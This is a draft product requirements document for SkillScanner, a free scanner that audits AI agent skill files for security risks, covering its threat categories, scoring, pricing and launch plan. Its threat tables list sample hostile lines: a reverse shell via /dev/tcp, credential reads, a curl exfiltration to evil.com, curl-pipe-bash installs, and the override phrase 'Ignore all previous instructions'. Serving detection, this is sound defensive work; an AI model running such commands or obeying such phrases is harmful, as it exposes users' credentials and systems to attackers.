# SkillScanner — Product Requirements Document

**Version:** 1.0-Draft
**Date:** 2026-03-27
**Author:** Steve Brodson / Blastr
**Status:** Draft for Review

---

## 1. Executive Summary

SkillScanner is a **trust engine**, not a SaaS product. It's a free web-based security scanner for AI agent skills (Claude Code, OpenClaw, Cursor, Windsurf, Cline, MCP servers) that demonstrates expertise, builds audience, and converts to Blocksentience consulting, speaking engagements, and enterprise advisory.

**Core insight:** SaaS is being eaten by frontier AI models. The survivors are infrastructure, network effects, and trust/brand. SkillScanner is category 3 — the scanner proves Steve Brodson is the person to talk to about agentic security.

**One-liner:** Paste a GitHub URL. Get a security audit in 60 seconds.

---

## 2. Product Vision

### 2.1 Positioning
- **Not:** "A SaaS app that scans skills for $10/month"
- **Is:** "The security expert who built a tool so good he gives it away"
- **Analogy:** VirusTotal for AI agent skills — free scanning that builds a threat intelligence database and positions the creator as the authority

### 2.2 Strategic Goals (6 months)
| Goal | Metric | Target |
|------|--------|--------|
| Database scale | Scans in database | 1,000+ |
| Audience growth | Adversarial Minds subscribers | 2,000+ |
| Revenue | Paid audits or Blocksentience leads | 3-5 |
| Reputation | Speaking invites from scanner credibility | 1+ |
| Education | Secure vibe coding content published | 4+ articles/talks |

### 2.3 What Makes It Trustworthy
1. **Confidence scoring** — Every finding tagged high/medium/low confidence (deterministic vs AI-inferred)
2. **Evidence chains** — Every finding links to exact file, line, and pattern
3. **Comparison data** — "This skill scores 72/100. Median for Claude Code skills is 58. Safer than 78% of scanned skills."
4. **Professional reports** — Shareable, PDF-quality output worth forwarding to a CTO
5. **Transparency** — "We checked X, Y, Z. We did NOT check A, B, C. Here's why."

---

## 3. Target Users

### Primary Personas

**Persona 1: Vibe Coder (Non-Technical)**
- Uses Cursor/Windsurf/ChatGPT to build things without deep technical knowledge
- Installs skills because "someone on Twitter said it was good"
- Doesn't read code — needs plain-English explanations of risk
- **Buying trigger:** "I just installed a skill and it asked for full filesystem access. Is that normal?"

**Persona 2: Startup Founder (Agentic Platforms)**
- Building on Claude Code, OpenClaw, or MCP
- Evaluating skills before allowing them in their team's workflow
- Wants to move fast but not get pwned
- **Buying trigger:** Preparing for a security review or investor due diligence

**Persona 3: Individual Dev (Technical)**
- Experienced developer exploring agentic coding
- Can read code but wants a second opinion
- Values efficiency — will use a scanner that saves them 30 minutes of manual review
- **Buying trigger:** Curiosity or a near-miss with a suspicious skill

### Secondary Personas (Conversion Targets)
- **Security teams** evaluating skills for org-wide deployment → enterprise audit engagement
- **AI startup CTOs** building agentic products → Blocksentience advisory
- **Community members** (Adversarial Minds) → newsletter subscribers, course buyers, speaking attendees

---

## 4. User Journey

### 4.1 First Visit (60 seconds to value)
1. Land on homepage → clear value prop + sample report
2. Paste GitHub URL → auto-detect platform (Claude Code, OpenClaw, Cursor, etc.)
3. Scan runs (15-30 seconds) → progress indicator with category breakdown
4. Report appears → risk score, findings ranked by severity, comparison to database
5. CTA: "Get the full report + safety recommendations → enter email"

### 4.2 Email Capture
- Free summary visible immediately
- Full report (remediation code, comparison data, PDF export) requires email
- Weekly digest: "3 risky skills we found this week" — builds newsletter habit

### 4.3 Conversion Paths

**Path A: Free → Paid Audit ($49)**
- User scans a skill → findings are concerning
- CTA: "Get a detailed audit with remediation code and comparison to our database — $49 one-time"
- Includes: full report, line-by-line findings, fix suggestions, PDF export

**Path B: Free → Blocksentience**
- Enterprise user or founder scans multiple skills → pattern of concern
- CTA: "Scanning your team's entire skill stack? Let's talk about an org-wide audit"
- Books discovery call → Blocksentience engagement ($5K-$50K)

**Path C: Free → Education**
- Weekly digest reader → finds value in the analysis
- CTA: "Learn secure vibe coding practices" → Adversarial Minds content, workshops, courses

**Path D: API / Agent-to-Agent**
- Future: Agents scanning skills before installing them
- API access as a paid feature
- Positions SkillScanner as infrastructure, not just a tool

---

## 5. Scanning Engine

### 5.1 Supported Platforms
- **Skill files:** Claude Code (CLAUDE.md, .claude/), OpenClaw (SKILL.md, tools/), Cursor (.cursor/rules), Windsurf (.windsurf/), Cline
- **MCP servers:** Detection in MVP, full scanning in v2
- **Future:** Auto-detect platform from repo structure

### 5.2 Threat Categories

#### Tier 1: Hard-Stop Deterministic (Must Catch — Zero Tolerance)
These produce binary PASS/FAIL results. Any finding = automatic risk flag.

| Category | What We Check | Examples |
|----------|--------------|----------|
| **Code Injection** | `eval()`, `exec()`, reverse shells, dynamic code loading, deserialization | `eval(userInput)`, `bash -i >& /dev/tcp/...`, `pickle.loads()` |
| **Obfuscation** | Zero-width chars, multi-layer encoding, homoglyphs, string concat evasion | U+200B in instructions, `base64(base64(payload))`, `"ba"+"sh"` |
| **Memory Poisoning** | Writes to agent config/profile files that persist across sessions | Appending to `CLAUDE.md`, `.bashrc`, `~/.cursor/rules` |
| **Credential Access** | Reading credential files, env vars, SSH keys, cloud creds | `cat ~/.aws/credentials`, `echo $GITHUB_TOKEN`, `~/.ssh/id_rsa` |

#### Tier 2: AI Analysis (Confidence-Scored Findings)
These require semantic understanding. Findings include confidence level (high/medium/low).

| Category | What We Check | Examples |
|----------|--------------|----------|
| **Prompt Injection** | Instruction manipulation, role overrides, encoded commands, conditional triggers | "Ignore all previous instructions", base64-decoded instructions |
| **Data Exfiltration** | Outbound network calls with data, DNS exfiltration, webhook abuse, covert channels | `curl -d $TOKEN https://evil.com`, encoded DNS queries |
| **Dangerous Operations** | Destructive commands, privilege escalation, unsafe chaining (context-dependent) | `rm -rf` in a "code review" skill, `sudo chmod 777` |
| **Supply Chain** | Installing from untrusted sources, curl-pipe-bash, force flags | `npm install http://evil.com/pkg`, `curl | bash`, `--force` |

#### Tier 3: Informational (Low Confidence, No Severity Ranking)
| Category | What We Check | Why Informational |
|----------|--------------|-------------------|
| **Excessive Agency** | Permissions exceeding stated purpose | Hard to automate — needs human judgment |
| **Social Engineering** | Fake branding, trust indicators, name spoofing | High false positive risk |

### 5.3 Scoring System
- **Overall score:** 0-100 based on weighted findings
- **Category scores:** Per-category breakdown
- **Comparison percentile:** "Safer than X% of [platform] skills we've scanned"
- **Confidence indicator:** Each finding tagged with how it was detected (deterministic / AI / informational)

### 5.4 Report Format
- **Summary section:** Score, verdict (Safe / Caution / Risky / Dangerous), top 3 findings
- **Findings section:** Each finding with severity, category, confidence, file:line, evidence, explanation, remediation
- **Comparison section:** Percentile ranking, similar skills, database stats
- **Recommendations section:** Plain-English next steps
- **Export:** PDF-quality shareable report

---

## 6. Pricing & Monetization

### 6.1 Free Tier (No Account Required)
- Scan any public GitHub repo
- View summary report (score, verdict, top findings)
- Rate limit: 5 scans/hour (anonymous), 20 with free account

### 6.2 Free Account (Email Required)
- Scan history saved
- Full report with all findings and remediation
- Comparison data and database stats
- Weekly "risky skills" digest

### 6.3 One-Time Deep Audit ($49)
- Full audit report with line-by-line analysis
- Comparison to database (percentile rankings)
- PDF export with professional formatting
- Remediation code snippets

### 6.4 Blocksentience Engagements
- Organization-wide skill audit
- Agentic architecture security review
- Secure development practices workshop
- Ongoing monitoring and advisory
- **Pricing:** Custom ($5K-$50K+)

### 6.5 Future: API Access
- Agent-to-agent scanning (agents scan skills before installing)
- CI/CD integration
- Bulk scanning
- **Pricing:** Per-scan credits or monthly API plan

---

## 7. Technical Architecture

### 7.1 Tech Stack
- **Frontend:** Next.js 15 + TypeScript + TailwindCSS v4
- **Backend:** Convex (serverless functions, real-time)
- **Auth:** Clerk (free tier supports our needs)
- **Hosting:** Vercel (auto-deploy from GitHub)
- **AI:** Claude API (Sonnet) for analysis + GPT-4o-mini as fallback
- **Database:** Convex (scans, users, findings, comparison data)

### 7.2 Scanning Pipeline
```
GitHub URL → Clone/Download → Platform Detection
  → Tier 1: Deterministic checks (regex, AST, pattern matching)
  → Tier 2: AI analysis (prompt to Claude with skill content)
  → Tier 3: Informational flags
  → Score calculation
  → Report generation
  → Database storage (anonymized findings for comparisons)
```

### 7.3 Key Technical Decisions
- **No code execution** — pure static analysis + AI. No sandboxing in MVP (too complex, too risky)
- **Clone, don't fork** — `git clone --depth 1` into ephemeral storage, delete after scan
- **Rate limiting** — IP-based for anonymous, account-based for registered users
- **Parallel scanning** — Tier 1 and Tier 2 run concurrently, Tier 3 runs after

---

## 8. MVP Scope (What Ships First)

### Must Have (Week 1-2)
- [ ] Landing page with clear value prop + sample report
- [ ] GitHub URL input + platform auto-detection
- [ ] Tier 1 scanning (4 deterministic categories)
- [ ] Tier 2 scanning (4 AI analysis categories)
- [ ] Risk score + verdict
- [ ] Summary report visible without account
- [ ] Email capture for full report
- [ ] Rate limiting (5/hour anonymous, 20 with account)
- [ ] Clerk auth (sign up / sign in)

### Should Have (Week 3-4)
- [ ] Scan history for logged-in users
- [ ] Comparison data ("safer than X%")
- [ ] PDF-quality report export
- [ ] Tier 3 informational flags
- [ ] MCP server detection (flag repos containing MCP configs)
- [ ] "One-time deep audit" purchase flow ($49)

### Nice to Have (Month 2)
- [ ] Public searchable database of scanned skills
- [ ] API access for CI/CD
- [ ] Browser extension (scan from GitHub directly)
- [ ] Private repo scanning via GitHub OAuth
- [ ] Full MCP server scanning
- [ ] CLI tool for local scanning

---

## 9. Success Metrics

### Leading Indicators
- Scans per day (target: 10+ by week 4, 50+ by month 3)
- Email capture rate (target: 30%+ of scans)
- Newsletter conversion from scanner traffic (target: 20%+)

### Lagging Indicators
- Paid audits booked (target: 3-5 in first 6 months)
- Blocksentience leads from scanner (target: 2-3 discovery calls)
- Speaking invitations attributed to scanner credibility (target: 1+)
- Adversarial Minds subscriber growth from scanner (target: 500+)

### Quality Indicators
- False positive rate (target: <15% for Tier 1, <30% for Tier 2)
- User feedback score (post-scan NPS)
- Report share rate (% of reports that get shared/exported)

---

## 10. Competitive Positioning

### What We're NOT
- Not Snyk (dependency scanning — complementary, not competitive)
- Not promptfoo (LLM red-teaming — different layer of the stack)
- Not CalypsoAI/Protect AI (enterprise AI security — different market)
- Not a subscription SaaS (one-time purchases + consulting, not recurring revenue)

### What We ARE
- **The only tool** that scans skill files across multiple agent platforms from a URL
- **The only tool** with memory poisoning detection (novel threat category)
- **Zero-setup workflow** — no CLI, no API keys, no installation
- **AI-first + deterministic** — catches what static analysis misses
- **Trust engine** — the scanner is marketing for Blocksentience expertise

### Primary Competitor: Repello SkillCheck
- They have: pre-scanned catalog, ZIP upload, ClawHavoc research pedigree
- We have: GitHub URL scanning, multi-platform, AI analysis, comparison data, remediation code
- **Our advantage:** Faster workflow (paste URL vs upload ZIP), broader platform support, actionable remediation
- **Their advantage:** First mover, existing catalog, community trust

---

## 11. Launch Plan

### Phase 1: Build (Weeks 1-2)
- Clean Next.js/Clerk/Convex/Vercel project from scratch
- Implement scanning engine (Tier 1 + Tier 2)
- Landing page + scan UI + report generation

### Phase 2: Soft Launch (Week 3)
- Deploy to Vercel
- Share with Adversarial Minds audience + Twitter/X
- Seed the database with 50-100 popular skills (proactive scans)
- Collect feedback, tune false positive rates

### Phase 3: Content Engine (Week 4+)
- "Risky Skills of the Week" newsletter series
- Secure vibe coding blog posts
- Social proof from scan data ("We've scanned X skills and found Y% with critical issues")
- Speaking proposals anchored by scanner credibility

### Phase 4: Monetize (Month 2+)
- Launch $49 deep audit
- Blocksentience lead gen CTAs
- API access for power users

---

## 12. Open Questions

1. **MCP scanning priority** — detection-only in MVP or defer entirely?
2. **AI model choice** — Claude Sonnet for all analysis, or mix models by category?
3. **Database seeding** — proactively scan popular skills or let it grow organically?
4. **$49 price point** — test with a few users first or launch with it?
5. **Adversarial Minds integration** — co-branded? Separate domain? Subdomain?
6. **Community giveaway** — free accounts for Adversarial Minds community members?

---

## Appendix A: Competitive Analysis
See: `docs/skillscanner-competitive-analysis.md`

## Appendix B: Threat Category Deep Dive
See: `docs/skillscanner-competitive-analysis.md` (Section 4)

## Appendix C: Platform-Specific File Patterns
*(To be added during technical design)*

## Appendix D: Sample Report
*(To be designed during UI/UX phase)*
